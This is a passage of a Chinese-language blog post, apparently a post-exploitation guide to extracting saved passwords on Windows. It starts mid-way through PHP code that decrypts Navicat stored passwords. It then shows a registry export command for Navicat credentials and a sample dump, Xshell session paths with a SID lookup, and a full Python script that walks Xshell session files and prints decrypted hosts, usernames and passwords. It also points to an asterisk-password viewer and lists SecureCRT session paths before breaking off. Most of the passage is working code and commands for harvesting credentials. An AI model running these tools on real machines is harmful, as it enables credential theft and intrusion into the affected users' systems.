class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">                <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">encryptTwelve</span>(<span class="variable">$string</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">encryptEleven</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$round</span> = <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">floor</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>) / <span class="number">8</span>));</span><br><span class="line">        <span class="variable">$leftLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>) % <span class="number">8</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$currentVector</span> = <span class="variable language_">$this</span>-&gt;blowIv;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$round</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$temp</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">encryptBlock</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">xorBytes</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$string</span>, <span class="number">8</span> * <span class="variable">$i</span>, <span class="number">8</span>), <span class="variable">$currentVector</span>));</span><br><span class="line">            <span class="variable">$currentVector</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">xorBytes</span>(<span class="variable">$currentVector</span>, <span class="variable">$temp</span>);</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable">$temp</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$leftLength</span>) &#123;</span><br><span class="line">            <span class="variable">$currentVector</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">encryptBlock</span>(<span class="variable">$currentVector</span>);</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">xorBytes</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$string</span>, <span class="number">8</span> * <span class="variable">$i</span>, <span class="variable">$leftLength</span>), <span class="variable">$currentVector</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">strtoupper</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$result</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">encryptBlock</span>(<span class="params"><span class="variable">$block</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$block</span>, <span class="string">&#x27;BF-ECB&#x27;</span>, <span class="variable">$this</span>-&gt;blowKey, OPENSSL_RAW_DATA|OPENSSL_NO_PADDING); </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">decryptBlock</span>(<span class="params"><span class="variable">$block</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$block</span>, <span class="string">&#x27;BF-ECB&#x27;</span>, <span class="variable">$this</span>-&gt;blowKey, OPENSSL_RAW_DATA|OPENSSL_NO_PADDING); </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">xorBytes</span>(<span class="params"><span class="variable">$str1</span>, <span class="variable">$str2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$str1</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$result</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$str1</span>[<span class="variable">$i</span>]) ^ <span class="title function_ invoke__">ord</span>(<span class="variable">$str2</span>[<span class="variable">$i</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">encryptTwelve</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$string</span>, <span class="string">&#x27;AES-128-CBC&#x27;</span>, <span class="variable">$this</span>-&gt;aesKey, OPENSSL_RAW_DATA, <span class="variable">$this</span>-&gt;aesIv);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">strtoupper</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$result</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable language_">$this</span>-&gt;version) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">                <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">decryptEleven</span>(<span class="variable">$string</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">                <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">decryptTwelve</span>(<span class="variable">$string</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">decryptEleven</span>(<span class="params"><span class="variable">$upperString</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$string</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$upperString</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$round</span> = <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">floor</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>) / <span class="number">8</span>));</span><br><span class="line">        <span class="variable">$leftLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>) % <span class="number">8</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$currentVector</span> = <span class="variable language_">$this</span>-&gt;blowIv;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$round</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$encryptedBlock</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$string</span>, <span class="number">8</span> * <span class="variable">$i</span>, <span class="number">8</span>);</span><br><span class="line">            <span class="variable">$temp</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">xorBytes</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">decryptBlock</span>(<span class="variable">$encryptedBlock</span>), <span class="variable">$currentVector</span>);</span><br><span class="line">            <span class="variable">$currentVector</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">xorBytes</span>(<span class="variable">$currentVector</span>, <span class="variable">$encryptedBlock</span>);</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable">$temp</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$leftLength</span>) &#123;</span><br><span class="line">            <span class="variable">$currentVector</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">encryptBlock</span>(<span class="variable">$currentVector</span>);</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">xorBytes</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$string</span>, <span class="number">8</span> * <span class="variable">$i</span>, <span class="variable">$leftLength</span>), <span class="variable">$currentVector</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">decryptTwelve</span>(<span class="params"><span class="variable">$upperString</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$string</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$upperString</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$string</span>, <span class="string">&#x27;AES-128-CBC&#x27;</span>, <span class="variable">$this</span>-&gt;aesKey, OPENSSL_RAW_DATA, <span class="variable">$this</span>-&gt;aesIv);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> <span class="title">FatSmallTools</span>\<span class="title">NavicatPassword</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//需要指定版本，11或12</span></span><br><span class="line"><span class="variable">$navicatPassword</span> = <span class="keyword">new</span> <span class="title class_">NavicatPassword</span>(<span class="number">11</span>);</span><br><span class="line"><span class="comment">//填上你的加密的密码</span></span><br><span class="line"><span class="variable">$decode</span> = <span class="variable">$navicatPassword</span>-&gt;<span class="title function_ invoke__">decrypt</span>(<span class="string">&#x27;EF176B08C2D7735DB81C&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$decode</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><h4 id="不能RDP连接到机器"><a href="#不能RDP连接到机器" class="headerlink" title="不能RDP连接到机器"></a>不能RDP连接到机器</h4><p>使用命令来保存注册列表的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg export HKCU\SOFTWARE\PremiumSoft\Navicat\Servers navicat</span><br></pre></td></tr></table></figure><p>提取出来的内容如下，解密方式和上面一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers]</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers\test]</span><br><span class="line">&quot;ConnType&quot;=&quot;ctMYSQL&quot;</span><br><span class="line">&quot;ConnTypeOra&quot;=&quot;ctoBasic&quot;</span><br><span class="line">&quot;TNS&quot;=&quot;&quot;</span><br><span class="line">&quot;DatabaseFileName&quot;=&quot;&quot;</span><br><span class="line">&quot;Host&quot;=&quot;127.0.0.1&quot;</span><br><span class="line">&quot;Port&quot;=dword:00000cea</span><br><span class="line">&quot;InitialDatabase&quot;=&quot;&quot;</span><br><span class="line">&quot;OraServiceNameType&quot;=&quot;snServiceName&quot;</span><br><span class="line">&quot;MSSQLAuthenMode&quot;=&quot;mamSQLServer&quot;</span><br><span class="line">&quot;UserName&quot;=&quot;root&quot;</span><br><span class="line">&quot;Pwd&quot;=&quot;EF176B08C2D7735DB81C&quot;</span><br><span class="line">&quot;AskPassword&quot;=&quot;false&quot;</span><br><span class="line">&quot;Codepage&quot;=dword:0000fde9</span><br><span class="line">&quot;OraRole&quot;=&quot;orDefault&quot;</span><br><span class="line">&quot;OraOSAuthentication&quot;=dword:00000000</span><br><span class="line">&quot;AutoConnect&quot;=dword:00000000</span><br><span class="line">&quot;QuerySavePath&quot;=&quot;C:\\Users\\ascotbe\\Documents\\Navicat\\MySQL\\servers\\test&quot;</span><br><span class="line">&quot;UseCompression&quot;=dword:00000000</span><br><span class="line">&quot;UseCharacterSet&quot;=dword:00000001</span><br><span class="line">&quot;UsePingInterval&quot;=dword:00000000</span><br><span class="line">&quot;PingInterval&quot;=dword:000000f0</span><br><span class="line">&quot;UseNamedPipe&quot;=dword:00000000</span><br><span class="line">&quot;NamedPipeSocket&quot;=&quot;/tmp/mysql.sock&quot;</span><br><span class="line">&quot;SQLiteEncrypted&quot;=dword:00000000</span><br><span class="line">&quot;UseEncryption&quot;=dword:00000000</span><br><span class="line">&quot;UseAdvSettings&quot;=&quot;false&quot;</span><br><span class="line">&quot;UseSSL&quot;=dword:00000000</span><br><span class="line">&quot;UseSSLAuthen&quot;=dword:00000000</span><br><span class="line">&quot;PGSSLMode&quot;=&quot;smRequire&quot;</span><br><span class="line">&quot;ClientKey&quot;=&quot;&quot;</span><br><span class="line">&quot;ClientCert&quot;=&quot;&quot;</span><br><span class="line">&quot;CACert&quot;=&quot;&quot;</span><br><span class="line">&quot;VerifyCACert&quot;=dword:00000000</span><br><span class="line">&quot;Cipher&quot;=&quot;&quot;</span><br><span class="line">&quot;PGSSLCRL&quot;=&quot;&quot;</span><br><span class="line">&quot;UseSSH&quot;=dword:00000000</span><br><span class="line">&quot;SSH_Host&quot;=&quot;&quot;</span><br><span class="line">&quot;SSH_Port&quot;=dword:00000016</span><br><span class="line">&quot;SSH_UserName&quot;=&quot;&quot;</span><br><span class="line">&quot;SSH_AuthenMethod&quot;=&quot;saPassword&quot;</span><br><span class="line">&quot;SSH_SavePassword&quot;=dword:00000000</span><br><span class="line">&quot;SSH_PrivateKey&quot;=&quot;&quot;</span><br><span class="line">&quot;SSH_SavePassphrase&quot;=dword:00000000</span><br><span class="line">&quot;UseHTTP&quot;=dword:00000000</span><br><span class="line">&quot;HTTP_URL&quot;=&quot;&quot;</span><br><span class="line">&quot;HTTP_EncodeBase64&quot;=dword:00000000</span><br><span class="line">&quot;HTTP_Authen&quot;=dword:00000000</span><br><span class="line">&quot;HTTP_Username&quot;=&quot;&quot;</span><br><span class="line">&quot;HttpSavePassword&quot;=dword:00000000</span><br><span class="line">&quot;HTTP_CertAuth&quot;=dword:00000000</span><br><span class="line">&quot;HTTP_ClientKey&quot;=&quot;&quot;</span><br><span class="line">&quot;HTTP_ClientCert&quot;=&quot;&quot;</span><br><span class="line">&quot;HTTP_CACert&quot;=&quot;&quot;</span><br><span class="line">&quot;HTTP_Passphrase&quot;=&quot;&quot;</span><br><span class="line">&quot;HTTP_Proxy&quot;=dword:00000000</span><br><span class="line">&quot;HTTP_ProxyHost&quot;=&quot;&quot;</span><br><span class="line">&quot;HTTP_ProxyPort&quot;=dword:00000000</span><br><span class="line">&quot;HTTP_ProxyUsername&quot;=&quot;&quot;</span><br><span class="line">&quot;HttpProxySavePassword&quot;=dword:00000000</span><br><span class="line">&quot;NSYID&quot;=&quot;&quot;</span><br><span class="line">&quot;NSYHash&quot;=&quot;&quot;</span><br><span class="line">&quot;NSYNavicatID&quot;=&quot;&quot;</span><br><span class="line">&quot;NSYDirtyFlag&quot;=dword:00000000</span><br><span class="line">&quot;AskForSavePassword&quot;=dword:00000000</span><br></pre></td></tr></table></figure><h2 id="SSH密码"><a href="#SSH密码" class="headerlink" title="SSH密码"></a>SSH密码</h2><h3 id="Xshell密码"><a href="#Xshell密码" class="headerlink" title="Xshell密码"></a>Xshell密码</h3><p>默认保存路径</p><table><thead><tr><th>版本</th><th>路径</th></tr></thead><tbody><tr><td>Xshell 5</td><td>%userprofile%\Documents\NetSarang\Xshell\Sessions</td></tr><tr><td>Xshell 6</td><td>%userprofile%\Documents\NetSarang Computer\6\Xshell\Sessions</td></tr><tr><td>Xshell 7</td><td>%userprofile%\Documents\NetSarang Computer\7\Xshell\Sessions</td></tr></tbody></table><p>关于xshell加密方式可以查看<a href="https://rcoil.me/2019/09/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd/">这篇文章</a></p><h4 id="Xshell-5-amp-Xshell-6"><a href="#Xshell-5-amp-Xshell-6" class="headerlink" title="Xshell 5&amp;Xshell 6"></a>Xshell 5&amp;Xshell 6</h4><p>首先需获取到用户的SID值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\ascotbe&gt; whoami /user</span><br><span class="line"></span><br><span class="line">用户信息</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">用户名           SID</span><br><span class="line">================ ==============================================</span><br><span class="line">樱岛麻衣\ascotbe S-1-5-21-1645164750-2672341361-3879437546-1000</span><br></pre></td></tr></table></figure><p>然后使用脚本解密</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\xshell.py -s username+sid -p <span class="string">&quot;文件路径&quot;</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/WindowsGrabPassword/19.png" alt="image-20210611142341029"></p><p>脚本代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> configparser</span><br><span class="line"><span class="comment">#pip install pycryptodome</span></span><br><span class="line"><span class="comment">#pip install pywin32</span></span><br><span class="line"><span class="keyword">from</span> win32api <span class="keyword">import</span> GetComputerName, GetUserName</span><br><span class="line"><span class="keyword">from</span> win32security <span class="keyword">import</span> LookupAccountName, ConvertSidToStringSid</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_string</span>(<span class="params">a1, a2</span>):</span><br><span class="line">    v1 = base64.b64decode(a2)</span><br><span class="line">    v3 = ARC4.new(SHA256.new(a1.encode(<span class="string">&#x27;ascii&#x27;</span>)).digest()).decrypt(v1[:<span class="built_in">len</span>(v1) - <span class="number">0x20</span>])</span><br><span class="line">    <span class="keyword">if</span> SHA256.new(v3).digest() == v1[-<span class="number">32</span>:]:</span><br><span class="line">        <span class="keyword">return</span> v3.decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&quot;xsh, xfp password decrypt&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;-s&quot;</span>, <span class="string">&quot;--sid&quot;</span>, default=<span class="string">&quot;&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;`username`+`sid`, user `whoami /user` in command.&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--password&quot;</span>, default=<span class="string">&quot;&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;the password in sessions or path of sessions&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.sid:</span><br><span class="line">    args.sid = GetUserName() + ConvertSidToStringSid(LookupAccountName(GetComputerName(), GetUserName())[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.password:</span><br><span class="line">    args.password = os.path.join(os.environ[<span class="string">&quot;USERPROFILE&quot;</span>], <span class="string">r&quot;Documents\NetSarang Computer\6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(args.password):</span><br><span class="line">    r = decrypt_string(args.sid, args.password)</span><br><span class="line">    <span class="keyword">if</span> r:</span><br><span class="line">        <span class="built_in">print</span>(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(args.password):</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> files:</span><br><span class="line">        <span class="keyword">if</span> f.endswith(<span class="string">&quot;.xsh&quot;</span>) <span class="keyword">or</span> f.endswith(<span class="string">&quot;.xfp&quot;</span>):</span><br><span class="line">            filepath = os.path.join(root, f)</span><br><span class="line">            cfg = configparser.ConfigParser()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                cfg.read(filepath)</span><br><span class="line">            <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">                cfg.read(filepath, encoding=<span class="string">&quot;utf-16&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> f.endswith(<span class="string">&quot;.xsh&quot;</span>):</span><br><span class="line">                    host = <span class="string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(cfg[<span class="string">&quot;CONNECTION&quot;</span>][<span class="string">&quot;Host&quot;</span>], cfg[<span class="string">&quot;CONNECTION&quot;</span>][<span class="string">&quot;Port&quot;</span>])</span><br><span class="line">                    username = cfg[<span class="string">&quot;CONNECTION:AUTHENTICATION&quot;</span>][<span class="string">&quot;UserName&quot;</span>]</span><br><span class="line">                    password = decrypt_string(args.sid, cfg[<span class="string">&quot;CONNECTION:AUTHENTICATION&quot;</span>][<span class="string">&quot;Password&quot;</span>])</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    host = <span class="string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(cfg[<span class="string">&quot;Connection&quot;</span>][<span class="string">&quot;Host&quot;</span>], cfg[<span class="string">&quot;Connection&quot;</span>][<span class="string">&quot;Port&quot;</span>])</span><br><span class="line">                    username = cfg[<span class="string">&quot;Connection&quot;</span>][<span class="string">&quot;UserName&quot;</span>]</span><br><span class="line">                    password = decrypt_string(args.sid, cfg[<span class="string">&quot;Connection&quot;</span>][<span class="string">&quot;Password&quot;</span>])</span><br><span class="line">                <span class="built_in">print</span>(</span><br><span class="line">                    <span class="string">f&quot;<span class="subst">&#123;filepath:=^<span class="number">100</span>&#125;</span>\nHost:     <span class="subst">&#123;host&#125;</span>\nUsername: <span class="subst">&#123;username&#125;</span>\nPassword: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;filepath:=^<span class="number">100</span>&#125;</span>\nError:<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="Xshell-7"><a href="#Xshell-7" class="headerlink" title="Xshell 7"></a>Xshell 7</h4><p>这个版本目前我没有找到解密方式，只能使用比较蠢的方式</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/WindowsGrabPassword/20.gif" alt="1"></p><p>星号密码查看器：<a href="https://github.com/Ascotbe/Image/blob/master/WindowsGrabPassword/ViewPass.exe">备份下载</a></p><h3 id="SecureCRT密码"><a href="#SecureCRT密码" class="headerlink" title="SecureCRT密码"></a>SecureCRT密码</h3><p>保存位置如下，绿色版本的话在下载的文件夹中</p><table><thead><tr><th>版本</th><th>路径</th></tr></thead><tbody><tr><td>全版本通用</td><td>%APPDATA%\VanDyke\Config\Sessions</td></tr></tbody></table><h4 id="小于7-X版本"><a href="#小于7-X版本" class="headerlink" title="小于7.X版本"></a>小于7.X版本</h4><p>把<code>*.ini</code>文件拉取下来直接使用脚本解密，这个版本没有测试过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span 